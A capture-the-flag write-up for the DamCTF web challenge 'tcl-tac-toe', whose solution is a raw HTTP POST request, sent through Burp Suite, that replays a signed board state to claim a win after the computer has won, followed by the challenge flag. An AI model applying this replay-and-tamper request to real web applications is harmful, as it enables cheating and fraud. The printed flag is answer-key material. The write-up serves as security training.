# **Writeup - DamCTF**

* Category **web** 
* Name **tcl-tac-toe** 

## Description

Time to tackle tcl-tac-toe: the tricky trek towards top-tier triumph


## **Solution**

Make a request after the PC has won using Burp Suite

`POST /update_board HTTP/1.1`
`Host: 161.35.58.232`
`User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0`
`Accept: */*`
`Accept-Language: en-US,en;q=0.5`
`Accept-Encoding: gzip, deflate`
`Content-Type: application/x-www-form-urlencoded`
`Content-Length: 611`
`Origin: http://161.35.58.232`
`Connection: close`
`Referer: http://161.35.58.232/`

`prev_board=X%20O%20O%20X%20X%20O%20-%20X%20O&new_board=X%20O%20O%20X%20X%20O%20X%20X%20O&signature=1d666ec22c2abd2d5905093b2bbcef6d44449ebfa325386ac3e5b048bb2e1d294f5d0c7c8fdf7e0b53ff35e2ce68e1408ca239282ce3cb312822680cc1a184d2d6e1711cfb82dad448632b33f792743cfc26bd45c36dcc1b2a9731996fc8be3d7ce8b2e5e3dcc246892dd9a283178017d0e7a67b76f5eb8ad886be8f116f1b4392bc0600f4df8eec9c7fd052f103dc78cc3afff11d5329f2003b1f47ad546ca593be79b2b42bda2cd390d466f8dea5616abad4a5b435ed09ed079cc276431b3e9b51f99454f159e4b5d79ab5c5c85ff956c91805fa5138ceb9908d32885d06bbddc54a6210bc6558ccc96db05084f4c78f8bbf661df8a2fcde95e7c9235d014f`

flag: **dam{7RY1N9_Tcl?_71m3_70_74k3_7W0_7YL3n0l_748L37s}**